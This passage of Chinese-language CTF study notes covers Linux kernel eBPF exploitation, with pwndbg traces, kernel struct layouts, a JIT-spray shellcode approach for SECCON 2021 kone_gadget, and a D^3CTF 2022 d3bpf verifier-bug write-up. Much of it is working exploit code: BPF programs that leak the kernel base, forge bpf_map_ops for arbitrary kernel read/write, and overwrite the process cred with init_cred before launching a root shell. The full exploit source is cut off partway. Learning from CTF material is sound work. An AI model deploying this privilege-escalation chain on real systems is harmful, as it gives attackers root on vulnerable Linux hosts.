               Start                End Perm     Size  Offset File (set vmmap-prefer-relpaths on)
  0xffffffffb49a3000 0xffffffffb4e00000 rw-p   45d000  462000 kernel [.bss]
► 0xffffffffc0225000 0xffffffffc0425000 r-xp   200000       0 kernel [.driver .bpf] +0x66c
pwndbg>
```

按`s`步入之后，就是在执行`bpf`程序了



我这里的程序能对应上：

```asm
pwndbg> p/x $rip
$9 = 0xffffffffc022566c
pwndbg> x/30i 0xffffffffc022566c
=> 0xffffffffc022566c:  endbr64
   0xffffffffc0225670:  nop    DWORD PTR [rax+rax*1+0x0]
   0xffffffffc0225675:  nop    DWORD PTR [rax]
   0xffffffffc0225678:  push   rbp
   0xffffffffc0225679:  mov    rbp,rsp
   0xffffffffc022567c:  endbr64
   0xffffffffc0225680:  sub    rsp,0x8
   0xffffffffc0225687:  push   rbx
   0xffffffffc0225688:  push   r13
   0xffffffffc022568a:  push   r14
   0xffffffffc022568c:  push   r15
   0xffffffffc022568e:  xor    eax,eax		#BPF_MOV64_IMM(BPF_REG_0, 0),
   0xffffffffc0225690:  mov    edi,0x63626160 	#BPF_MOV64_IMM(BPF_REG_1, test),
   0xffffffffc0225695:  mov    DWORD PTR [rbp-0x4],eax #BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_0, -4),
   0xffffffffc0225698:  lfence
   0xffffffffc022569b:  mov    rbx,rdi		#BPF_MOV64_REG(BPF_REG_6, BPF_REG_1),
   0xffffffffc022569e:  movabs rdi,0xffffa2eb81e43000 #BPF_LD_MAP_FD(BPF_REG_1, oob_map),
   0xffffffffc02256a8:  mov    rsi,rbp		#BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
   0xffffffffc02256ab:  add    rsi,0xfffffffffffffffc  #BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),
   0xffffffffc02256af:  add    rdi,0xf8
   0xffffffffc02256b6:  mov    eax,DWORD PTR [rsi+0x0]
   0xffffffffc02256b9:  cmp    rax,0x1
   0xffffffffc02256bd:  jae    0xffffffffc02256ce
   0xffffffffc02256bf:  and    eax,0x0
   0xffffffffc02256c2:  imul   rax,rax,0x150
   0xffffffffc02256c9:  add    rax,rdi
   0xffffffffc02256cc:  jmp    0xffffffffc02256d0
   0xffffffffc02256ce:  xor    eax,eax
   0xffffffffc02256d0:  test   rax,rax
   0xffffffffc02256d3:  jne    0xffffffffc02256de
```

```c
    size_t test = 0;
    memcpy(&test, "\x60\x61\x62\x63\x64\x65\x66\x67", 8);

    struct bpf_insn kleak_prog[] = {
        // load map_ptr_or_null in BPF_REG_0
        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_MOV64_IMM(BPF_REG_1, test),
        BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_0, -4),
        BPF_MOV64_REG(BPF_REG_6, BPF_REG_1),
        BPF_LD_MAP_FD(BPF_REG_1, oob_map),
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),
        BPF_CALL_FUNC(BPF_FUNC_map_lookup_elem), // returns map_ptr + 0x110 (offset of .values in array_map)
```









#### pwndbg

`pwndbg`有一个命令`kbpf`，但是题目编译的内核一般用不了这个命令，少了点东西。。。







### pwn思路

当我们用`bpf`系统调用创建了一个类型为`BPF_MAP_TYPE_ARRAY`的`map`的时候，会创建一个结构体：

```c
struct bpf_array {
        struct bpf_map             map;                  /*     0   240 */
        /* --- cacheline 3 boundary (192 bytes) was 48 bytes ago --- */
        u32                        elem_size;            /*   240     4 */
        u32                        index_mask;           /*   244     4 */
        struct bpf_array_aux *     aux;                  /*   248     8 */
        /* --- cacheline 4 boundary (256 bytes) --- */
        union {
                struct {
                        struct {
                        } __empty_value;                 /*   256     0 */
                        char       value[0];             /*   256     0 */
                };                                       /*   256     0 */
                struct {
                        struct {
                        } __empty_ptrs;                  /*   256     0 */
                        void *     ptrs[0];              /*   256     0 */
                };                                       /*   256     0 */
                struct {
                        struct {
                        } __empty_pptrs;                 /*   256     0 */
                        void *     pptrs[0];             /*   256     0 */
                };                                       /*   256     0 */
        };                                               /*   256     0 */

        /* size: 256, cachelines: 4, members: 5 */
};
```

其中最重要的就是第一个成员：

```c
struct bpf_map {
        const struct bpf_map_ops  * ops;                 /*     0     8 */
        struct bpf_map *           inner_map_meta;       /*     8     8 */
        void *                     security;             /*    16     8 */
        enum bpf_map_type          map_type;             /*    24     4 */
        u32                        key_size;             /*    28     4 */
        u32                        value_size;           /*    32     4 */
        u32                        max_entries;          /*    36     4 */
        u64                        map_extra;            /*    40     8 */
        u32                        map_flags;            /*    48     4 */
        u32                        id;                   /*    52     4 */
        struct btf_record *        record;               /*    56     8 */
        /* --- cacheline 1 boundary (64 bytes) --- */
        int                        numa_node;            /*    64     4 */
        u32                        btf_key_type_id;      /*    68     4 */
        u32                        btf_value_type_id;    /*    72     4 */
        u32                        btf_vmlinux_value_type_id; /*    76     4 */
        struct btf *               btf;                  /*    80     8 */
        char                       name[16];             /*    88    16 */
        struct mutex               freeze_mutex;         /*   104    32 */
        /* --- cacheline 2 boundary (128 bytes) was 8 bytes ago --- */
        atomic64_t                 refcnt;               /*   136     8 */
        atomic64_t                 usercnt;              /*   144     8 */
        union {
                struct work_struct work;                 /*   152    32 */
                struct callback_head rcu;                /*   152    16 */
        };                                               /*   152    32 */
        atomic64_t                 writecnt;             /*   184     8 */
        /* --- cacheline 3 boundary (192 bytes) --- */
        struct {
                const struct btf_type  * attach_func_proto; /*   192     8 */
                spinlock_t         lock;                 /*   200     4 */
                enum bpf_prog_type type;                 /*   204     4 */
                bool               jited;                /*   208     1 */
                bool               xdp_has_frags;        /*   209     1 */
        } owner;                                         /*   192    24 */

        /* XXX last struct has 6 bytes of padding */

        bool                       bypass_spec_v1;       /*   216     1 */
        bool                       frozen;               /*   217     1 */
        bool                       free_after_mult_rcu_gp; /*   218     1 */
        bool                       free_after_rcu_gp;    /*   219     1 */

        /* XXX 4 bytes hole, try to pack */

        atomic64_t                 sleepable_refcnt;     /*   224     8 */
        s64 *                      elem_count;           /*   232     8 */

        /* size: 240, cachelines: 4, members: 29 */
        /* sum members: 236, holes: 1, sum holes: 4 */
        /* paddings: 1, sum paddings: 6 */
        /* last cacheline: 48 bytes */
};
```

`bpf_map_ops`中存的是一系列虚表函数。通常，我们需要通过越界读写等手段，修改这个虚表

```c
// include/linux/bpf.h
/* map is generic key/value storage optionally accessible by eBPF programs */
struct bpf_map_ops {
	// ...

	/* funcs callable from userspace and from eBPF programs */
	void *(*map_lookup_elem)(struct bpf_map *map, void *key);
	long (*map_update_elem)(struct bpf_map *map, void *key, void *value, u64 flags);
	long (*map_delete_elem)(struct bpf_map *map, void *key);
	long (*map_push_elem)(struct bpf_map *map, void *value, u64 flags);
	long (*map_pop_elem)(struct bpf_map *map, void *value);
    
	// ...
};
```



- 泄露地址：把`ops`写回`bpf_array`中的`values`域中，读出来即可
- 任意地址读写：在`values`中伪造一个`ops`，劫持`ops`指针指向这个伪造的`ops`，这样调用某个虚表函数其实是调用我们想要调用的函数











`helper function`是内核定义的函数，能被`ebpf`程序调用

重要的函数：

- `bpf_map_lookup_elem`：



### 模板











## 例题



#### SEC CON CTF 2021 kone_gadget

```sh
mkdir initramfs
cd initramfs
cp ../rootfs.cpio .
sudo cpio -idm < ./rootfs.cpio
rm rootfs.cpio
```



```sh
gcc exp.c -static -masm=intel -g -o ./initramfs/exp
cd ./initramfs
sudo find . | sudo cpio -o --format=newc >../rootfs.cpio
cd ..
```



提供了一个新的系统调用，能控制rip，但是其他寄存器都置0

```
Added to arch/x86/entry/syscalls/syscall_64.tbl:
1337 64 seccon sys_seccon

Added to kernel/sys.c:
SYSCALL_DEFINE1(seccon, unsigned long, rip)
{
  asm volatile("xor %%edx, %%edx;"
               "xor %%ebx, %%ebx;"
               "xor %%ecx, %%ecx;"
               "xor %%edi, %%edi;"
               "xor %%esi, %%esi;"
               "xor %%r8d, %%r8d;"
               "xor %%r9d, %%r9d;"
               "xor %%r10d, %%r10d;"
               "xor %%r11d, %%r11d;"
               "xor %%r12d, %%r12d;"
               "xor %%r13d, %%r13d;"
               "xor %%r14d, %%r14d;"
               "xor %%r15d, %%r15d;"
               "xor %%ebp, %%ebp;"
               "xor %%esp, %%esp;"
               "jmp %0;"
               "ud2;"
               : : "rax"(rip));
  return 0;
}
```

大概思路就是往内核中写入一个one_gadget，调用它就能提权

同时，题目也禁掉了bpf系统调用

写了个exp:

```c
#include <stdio.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <errno.h>

int main() {
    // 尝试调用 bpf 系统调用
    long ret = syscall(321, 0, 0, 0); // 321 是 x64 下 bpf 的调用号
    if (ret == -1 && errno == ENOSYS) {
        printf("内核不支持该系统调用 (ENOSYS)\n");
    } else {
        printf("内核支持该系统调用，返回值为: %ld\n", ret);
    }
    return 0;
}
```

```sh
/ $ ./exp
内核不支持该系统调用 (ENOSYS)
```



```
/ # cat /proc/sys/net/core/bpf_jit_enable
1
```

来自AI：

```
如果是：

2 → 致盲开启，老套路基本死
1 → 还能打
0 → 先想办法打开 JIT
```

没开致盲





但是，平时我们自定义的沙箱规则其实就是一段bpf程序，它会被写入内核空间中。

所以，思路就是使用`prctl`写入一段bpf程序到内核中，调用`seccon`系统调用，控制`rip`执行这段我们自定义的程序来提权

- 程序怎么写？
- 怎么执行到这段程序？



##### 编写shellcode

- 开了`smep`、`smap`保护，需要写`cr4`寄存器为`0x6f0`来绕过
- 开了`kpti`，通过执行`swapgs_restore_regs_and_return_to_usermode`，切换页表后返回用户态提权



写入的指令需要是`ebpf`格式，经过`jit`编译后，是x86指令

这里两篇参考文章构造的`ebpf`指令格式都是，`p32(0)+p32(A)`，经过`jit`编译后他会变成`0xb8+p32(A)`存入内存中

> 这里的`ebpf`指令的`opcode`被设置为0，其实是设置成了`BPF_LD | BPF_IMM | BPF_W`，也就是`ldw`

```
pwndbg> x/32b 0xffffffffc00005d0
0xffffffffc00005d0:     0x48    0x89    0xc7    0x04    0xb8    0x58    0x90    0xeb
0xffffffffc00005d8:     0x01    0xb8    0xff    0xd0    0xeb    0x01    0xb8    0x58
0xffffffffc00005e0:     0x90    0xeb    0x01    0xb8    0xff    0xe0    0xeb    0x01
0xffffffffc00005e8:     0xb8    0x90    0x90    0xeb    0x01    0xb8    0x90    0x90
```

每两个A直接间隔一个`0xb8`，跳过`0xb8`的思路有两种：

- 写A中的一个字节为`0x3c`和`0xb8`组成 `cmp al, 0xb8`：

	```
	    内存            x86
	0xb0 0x12       mov al, 0x12
	0x90            nop
	0x3c 0xb8       cmp al, 0xb8    ;用0x3c吃掉一个0xb8
	0xb4 0x34       mov ah, 0x34
	0x90            nop
	0x3c ...        ...            ;继续吃掉下一个0xb8
	```

- 写A中的两个字节为`0xeb 0x01`（PC = PC+1），来跳过`0xb8`

	```
	    内存            x86
	0xb0 0x12        mov al, 0x12  
	0xeb 0x01        jmp $+3            ;直接过0xb8, 进入mov ah, 0x34, 效果等价于PC = PC+1
	0xb8
	0xb4 0x34        mov ah, 0x34
	0xeb 0x01        jmp $+3
	...
	```

参考文章1用的是思路1(但是打不通，不知道为什么)，参考文章2用的是思路2

















#### D^3CTF 2022__d3bpf

> 内核ebpf



这里的`bzImage`可以直接用`vmlinux-to-elf`提取



`patch`后，如果对一个寄存器右移的位数大于`insn_bitness`（ALU32运算为32，ALU64为64），则`verifier`认为该寄存器全部`bit`已知（补充：指针不可以与标记为`unknown`的寄存器进行ALU运算），且`verifier`认为其值为0

```diff
diff --git a/kernel/bpf/verifier.c b/kernel/bpf/verifier.c
index 37581919e..8e98d4af5 100644
--- a/kernel/bpf/verifier.c
+++ b/kernel/bpf/verifier.c
@@ -6455,11 +6455,11 @@ static int adjust_scalar_min_max_vals(struct bpf_verifier_env *env,
 			scalar_min_max_lsh(dst_reg, &src_reg);
 		break;
 	case BPF_RSH:
-		if (umax_val >= insn_bitness) {
-			/* Shifts greater than 31 or 63 are undefined.
-			 * This includes shifts by a negative number.
-			 */
-			mark_reg_unknown(env, regs, insn->dst_reg);
+		if (umin_val >= insn_bitness) {
+			if (alu32)
+				__mark_reg32_known(dst_reg, 0);
+			else
+				__mark_reg_known_zero(dst_reg);
 			break;
 		}
 		if (alu32)
```

把这个`patch`翻译一下：

```c
BPF_MOV64_IMM(BPF_REG_0, 0x1337),
BPF_MOV64_IMM(BPF_REG_1, 64),
BPF_ALU64_REG(BPF_RSH, BPF_REG_0, BPF_REG_1),
BPF_EXIT_INSN()
```

那么，`verifier`就会认为这个`reg0`为已知（known）的寄存器，且其值确定为0。但是由于CPU进行右移运算的时候，会把右移位数`&63`，所以实际上CPU执行的运算是`0x1337 >> 0`。

这里就伪造了一个绕过`verifier`检查的标量寄存器，我们利用这个标量寄存器和一些指针寄存器进行ALU运算，就造成了越界读写





##### 任意地址读写

写入`array_map_update_elem `、`ARRAY_MAP_LOOKUP_ELEM`、`array_of_map_gen_lookup`、`array_map_free`

`array_of_map_gen_lookup`

有个`map`类型是`BPF_MAP_TYPE_ARRAY_OF_MAPS`，它是一个存储`map`的数组，它的`lookup_elem`函数会解引用两次

```c
static void *array_of_map_lookup_elem(struct bpf_map *map, void *key)
{
	struct bpf_map **inner_map = array_map_lookup_elem(map, key);

	if (!inner_map)
		return NULL;

	return READ_ONCE(*inner_map);
}
```

把`map_lookup_elem`改成`array_of_map_gen_lookup`后，使用 `lookup_element`时`verifier`会认为它返回了一个指向`map_value`的指针，但是实际上返回的东西是用户可以控制的，因为他会再次解引用用户传入的东西









##### 思路流程



- 先初始化`stack-4`
- 保存r1中存的`ctx`到r6，后续需要使用到`ctx`就会到r6中找
- 调用辅助函数`BPF_FUNC_map_lookup_elem`，第一个参数为执行`map`的指针，第二个参数为`key`，值为0。返回值存在r0，为一个指向`value`域的地址（`struct bpf_array`）
- 调用完辅助函数后，`verifier`认为r0中的值的类型为`PTR_TO_MAP_VALUE_OR_NULL`，要对他进行非0验证，让他收敛（refine）成`PTR_TO_MAP_VALUE`才能进行解引用或者其他一些操作
- 构造一个绕过`verifier`检测的寄存器，让他指向`value - 0x110`这个地方，也就是虚表指针
- 把他写回`value`域，泄露出来

```c
    struct bpf_insn kleak_prog[] = {
        // load map_ptr_or_null in BPF_REG_0
        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_0, -4),
        BPF_MOV64_REG(BPF_REG_6, BPF_REG_1),
        BPF_LD_MAP_FD(BPF_REG_1, oob_map_fd),
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),
        BPF_CALL_FUNC(BPF_FUNC_map_lookup_elem), // returns map_ptr + 0x110 (offset of .values in array_map)
        
        // map_ptr_or_null -> map_ptr
        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
        BPF_EXIT_INSN(),

        // trigger vuln and make eBPF think we are still map_ptr + 0x110 but in reality we're map_ptr + 0x0
        BPF_MOV64_REG(BPF_REG_7, BPF_REG_0),
        // ALU Sanitation will set alu_limit = 0 but alu_limit - 1 will be used hence any value can be used
        BPF_MOV64_IMM(BPF_REG_0, 0x110),
        BPF_MOV64_IMM(BPF_REG_1, 64),
        BPF_ALU64_REG(BPF_RSH, BPF_REG_0, BPF_REG_1), // the bug
        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_0),
        BPF_LDX_MEM(BPF_DW, BPF_REG_8, BPF_REG_7, 0), // load the ptr (kbase leak)

        BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 0xc0), // map_ptr + 0x0 -> map_ptr + 0xc0
        BPF_LDX_MEM(BPF_DW, BPF_REG_9, BPF_REG_7, 0), // load the ptr (heap leak)

        // write the read ptr to map for reading it from userspace
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 0x50), // make map_ptr + 0xc0 to map_ptr + 0x110
        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_8, 0), // write array_map_ops ptr to maps_ptr + 0x110
        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_9, 8), // write *(map_ptr + 0xc0) to maps_ptr + 0x118
        BPF_EXIT_INSN(),
    };
```





- 获取`oob_map`的`value`地址，在其中伪造`fake_ops`，主要写入`array_map_update_elem `、`ARRAY_MAP_LOOKUP_ELEM`、`array_of_map_gen_lookup`、`array_map_free`
- 改`arb_read_write_map`的`ops`指向`fake_ops`

```c
    struct bpf_insn overwrite_ops[] = {
        BPF_MOV64_REG(BPF_REG_6, BPF_REG_1),
        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_0, -4),
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),
        BPF_LD_MAP_FD(BPF_REG_1, oob_map_fd),
        BPF_CALL_FUNC(BPF_FUNC_map_lookup_elem),

        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
        BPF_EXIT_INSN(),

        // setup fake bpf_map_ops struct with only needed values
        BPF_MOV64_REG(BPF_REG_7, BPF_REG_0), // move map_ptr + 0x110
        BPF_MOV64_IMM(BPF_REG_0, kbase + ARRAY_MAP_UPDATE_ELEM_OFFSET),
        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, 0x60),

        BPF_MOV64_IMM(BPF_REG_0, kbase + ARRAY_MAP_LOOKUP_ELEM_OFFSET),
        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, 0x58),

        BPF_MOV64_IMM(BPF_REG_0, kbase + 0x20e9c0), // array_of_map_gen_lookup
        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, 19 * 8),

        BPF_MOV64_IMM(BPF_REG_0, kbase + 0x20eff0), // array_map_free
        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, 3 * 8),

        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),
        BPF_LD_MAP_FD(BPF_REG_1, arb_read_write_map_fd),
        BPF_CALL_FUNC(BPF_FUNC_map_lookup_elem), // get values ptr

        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
        BPF_EXIT_INSN(),

        BPF_MOV64_REG(BPF_REG_7, BPF_REG_0),

        // trigger vuln
        BPF_MOV64_IMM(BPF_REG_0, 0x110),
        BPF_MOV64_IMM(BPF_REG_1, 64),
        BPF_ALU64_REG(BPF_RSH, BPF_REG_0, BPF_REG_1),
        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_0),

        BPF_LD_IMM64(BPF_REG_0, map_ptr_values),

        // overwrite map_ops with oob_map_ptr
        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, 0),

        BPF_EXIT_INSN(),
    };
```





- 把`arb_read_write_map`的`value`地址存到r8，`info_map`的`value`地址存到r9
- 通过`BPF_LD_ABS(BPF_B, 0),`，根据接收到的数据是0还是1决定调用`arb_read`还是`arb_write`
	- `arb_read`时：通过`arb_read`把要读的东西的地址写到`arb_read_write_map`中，再把这个地址写入`info_map`，通过`bpf_map_lookup_elem`（实际上执行的是`ARRAY_MAP_LOOKUP_ELEM`，会进行两次解引用）读这个地址中的内容，并返回
	- `arb_write`时：在`arb_read_write_map`中写入存储`addr`的地址，`info_map`中写入存储值的地址，把`info_map`的值存入`arb_read_write_map`，通过`BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_7, 0)`执行`*addr(r8) = value(r7)`

```c
    struct bpf_insn arb_read_write[] = {
        BPF_MOV64_REG(BPF_REG_6, BPF_REG_1),
        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_STX_MEM(BPF_W, BPF_REG_10, 0, -4),

        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),
        BPF_LD_MAP_FD(BPF_REG_1, arb_read_write_map_fd),
        BPF_CALL_FUNC(BPF_FUNC_map_lookup_elem), // will use array_of_map_gen_lookup

        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
        BPF_EXIT_INSN(),

        BPF_MOV64_REG(BPF_REG_8, BPF_REG_0),

        BPF_LD_ABS(BPF_B, 0),
        BPF_MOV64_REG(BPF_REG_9, BPF_REG_0), // decide bit for arb_read or arb_write

        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),
        BPF_LD_MAP_FD(BPF_REG_1, info_map_fd),
        BPF_CALL_FUNC(BPF_FUNC_map_lookup_elem),

        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
        BPF_EXIT_INSN(),

        BPF_JMP_IMM(BPF_JEQ, BPF_REG_9, 1, 4),

        BPF_LDX_MEM(BPF_DW, BPF_REG_7, BPF_REG_8, 0), // arb_read
        BPF_STX_MEM(BPF_DW, BPF_REG_0, BPF_REG_7, 0),

        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),

        BPF_LDX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, 0), // arb_write
        BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_7, 0),

        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),
    };

    setup_bpf_prog(arb_read_write, sizeof(arb_read_write)/sizeof(arb_read_write[0]));

    uint64_t current_task_struct = arb_read(arb_read(__per_cpu_offset) + current_task);
    uint64_t init_cred = kbase + INIT_CRED_OFFSET;

    arb_write(current_task_struct + CRED_OFFSET, init_cred);

    system("/bin/sh");
```



##### exp

```c
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <syscall.h>
#include <linux/bpf.h>
#include <sys/socket.h>
#include "bpf_insn.h"

#define ARRAY_MAP_OPS_OFFSET 0x10363a0
#define ARRAY_MAP_LOOKUP_ELEM_OFFSET 0x20e830
#define ARRAY_MAP_UPDATE_ELEM_OFFSET 0x20eeb0
#define PERCPU_OFFSET 0x149c900
#define current_task 0x17bc0
#define INIT_CRED_OFFSET 0x1a6b880
#define CRED_OFFSET 0xad8

int socks[2] = {-1};
int oob_map_fd, arb_read_write_map_fd, info_map_fd;

int bpf(int cmd, union bpf_attr *attr){
    return syscall(__NR_bpf, cmd, attr, sizeof(*attr));
}

int bpf_prog_load(union bpf_attr *attr){
    return bpf(BPF_PROG_LOAD, attr);
}

int bpf_map_create(uint32_t key_size, uint32_t value_size, uint32_t max_entries){
    union bpf_attr attr = {
        .map_type = BPF_MAP_TYPE_ARRAY,
        .key_size = key_size,
        .value_size = value_size,
        .max_entries = max_entries
    };

    return bpf(BPF_MAP_CREATE, &attr);
}

int bpf_map_update_elem(int map_fd, uint64_t key, uint64_t* value, uint64_t flags){
    union bpf_attr attr = {
        .map_fd = map_fd,
        .key = (uint64_t) &key,
        .value = (uint64_t) value,
        .flags = flags
    };

    return bpf(BPF_MAP_UPDATE_ELEM, &attr);
}

uint64_t bpf_map_lookup_elem(int map_fd, uint32_t key, int index){
    uint64_t value[0x150/8] = {};

    union bpf_attr attr = {
        .map_fd = map_fd,
        .key = (uint64_t) &key,
        .value = (uint64_t) &value,
    };

    bpf(BPF_MAP_LOOKUP_ELEM, &attr);
    return value[index];
}

union bpf_attr* create_bpf_prog(struct bpf_insn *insns, unsigned int insn_cnt){
    union bpf_attr *attr = (union bpf_attr *) malloc(sizeof(union bpf_attr));

    attr->prog_type = BPF_PROG_TYPE_SOCKET_FILTER;
    attr->insn_cnt = insn_cnt;
    attr->insns = (uint64_t) insns;
    attr->license = (uint64_t)"";

    return attr;
}

uint64_t arb_read(uint64_t addr){
    int req = 0;

    bpf_map_update_elem(arb_read_write_map_fd, 0, &addr, BPF_ANY);

    write(socks[1], &req, sizeof(req));

    return bpf_map_lookup_elem(info_map_fd, 0, 0);
}

int arb_write(uint64_t addr, uint64_t val){
    int req = 1;

    bpf_map_update_elem(arb_read_write_map_fd, 0, &addr, BPF_ANY);
    bpf_map_update_elem(info_map_fd, 0, &val, BPF_ANY);

    write(socks[1], &req, sizeof(req));

    return bpf_map_lookup_elem(info_map_fd, 0, 0) == val;
}

int attach_socket(int prog_fd){
    if(socks[0] == -1 && socketpair(AF_UNIX, SOCK_DGRAM, 0, socks) < 0){
        perror("socketpair");
        exit(1);
    }
    
    if(setsockopt(socks[0], SOL_SOCKET, SO_ATTACH_BPF, &prog_fd, sizeof(prog_fd)) < 0){
        perror("setsockopt");
        exit(1);
    }
}

void setup_bpf_prog(struct bpf_insn *insns, uint insncnt){
    union bpf_attr *prog = create_bpf_prog(insns, insncnt);
    int prog_fd = bpf_prog_load(prog);

    if(prog_fd < 0){
        perror("prog_load");
        exit(1);
    }

    attach_socket(prog_fd);
}
// void setup_bpf_prog(struct bpf_insn *insns, uint insncnt) {
//     // 1. 定义一个足够大的缓冲区来存放内核日志
//     static char log_buf[1024 * 1024]; 
    
//     union bpf_attr *prog = create_bpf_prog(insns, insncnt);
    
//     // 2. 注入日志参数
//     prog->log_level = 2;           // 级别 2 会显示指令重写 (Patching) 详情
//     prog->log_buf = (uint64_t)log_buf;
//     prog->log_size = sizeof(log_buf);

//     int prog_fd = bpf_prog_load(prog);

//     // 3. 打印日志
//     // 无论成功还是失败，打印 log_buf 都能看到 Verifier 做了什么
//     if (prog_fd < 0) {
//         printf("--- Verifier Log (Error) ---\n%s\n", log_buf);
//         perror("prog_load");
//         exit(1);
//     } else {
//         // 如果你想看成功加载后的指令（包含 ALU Sanitation），也打印出来
//         printf("--- Verifier Log (Success) ---\n%s\n", log_buf);
//     }

//     attach_socket(prog_fd);
//     free(prog); // 记得释放 malloc 的内存
// }
void run_bpf_prog(struct bpf_insn *insns, uint insncnt){
    int val = 0;

    setup_bpf_prog(insns, insncnt);
    write(socks[1], &val, sizeof(val));
}

int main(){
    uint64_t idx = 0;
    struct bpf_map_info map_info = {};

    oob_map_fd = bpf_map_create(4, 0x150, 1);
    arb_read_write_map_fd = bpf_map_create(4, 8, 1);
    info_map_fd = bpf_map_create(4, 8, 1);

    if(oob_map_fd < 0){
        perror("create_map");
        return 1;
    }

    struct bpf_insn kleak_prog[] = {
        // load map_ptr_or_null in BPF_REG_0
        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_0, -4),
        BPF_MOV64_REG(BPF_REG_6, BPF_REG_1),
        BPF_LD_MAP_FD(BPF_REG_1, oob_map_fd),
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),
        BPF_CALL_FUNC(BPF_FUNC_map_lookup_elem), // returns map_ptr + 0x110 (offset of .values in array_map)
        
        // map_ptr_or_null -> map_ptr
        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
        BPF_EXIT_INSN(),

        // trigger vuln and make eBPF think we are still map_ptr + 0x110 but in reality we're map_ptr + 0x0
        BPF_MOV64_REG(BPF_REG_7, BPF_REG_0),
        // ALU Sanitation will set alu_limit = 0 but alu_limit - 1 will be used hence any value can be used
        BPF_MOV64_IMM(BPF_REG_0, 0x110),
        BPF_MOV64_IMM(BPF_REG_1, 64),
        BPF_ALU64_REG(BPF_RSH, BPF_REG_0, BPF_REG_1), // the bug
        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_0),
        BPF_LDX_MEM(BPF_DW, BPF_REG_8, BPF_REG_7, 0), // load the ptr (kbase leak)

        BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 0xc0), // map_ptr + 0x0 -> map_ptr + 0xc0
        BPF_LDX_MEM(BPF_DW, BPF_REG_9, BPF_REG_7, 0), // load the ptr (heap leak)

        // write the read ptr to map for reading it from userspace
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 0x50), // make map_ptr + 0xc0 to map_ptr + 0x110
        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_8, 0), // write array_map_ops ptr to maps_ptr + 0x110
        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_9, 8), // write *(map_ptr + 0xc0) to maps_ptr + 0x118
        BPF_EXIT_INSN(),
    };

    run_bpf_prog(kleak_prog, sizeof(kleak_prog)/sizeof(kleak_prog[0]));

    uint64_t array_map_ops = bpf_map_lookup_elem(oob_map_fd, 0, 0);
    uint64_t map_ptr = bpf_map_lookup_elem(oob_map_fd, 0, 1) - 0xc0;
    uint64_t map_ptr_values = map_ptr + 0x110;
    uint64_t kbase = array_map_ops - ARRAY_MAP_OPS_OFFSET;
    uint64_t __per_cpu_offset = kbase + PERCPU_OFFSET;

    printf("array_map_ops: %p\nkbase: %p\nmap_ptr: %p\n", (void *)array_map_ops, (void *)kbase, (void *)map_ptr);

    struct bpf_insn overwrite_ops[] = {
        BPF_MOV64_REG(BPF_REG_6, BPF_REG_1),
        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_0, -4),
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),
        BPF_LD_MAP_FD(BPF_REG_1, oob_map_fd),
        BPF_CALL_FUNC(BPF_FUNC_map_lookup_elem),

        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
        BPF_EXIT_INSN(),

        // setup fake bpf_map_ops struct with only needed values
        BPF_MOV64_REG(BPF_REG_7, BPF_REG_0), // move map_ptr + 0x110
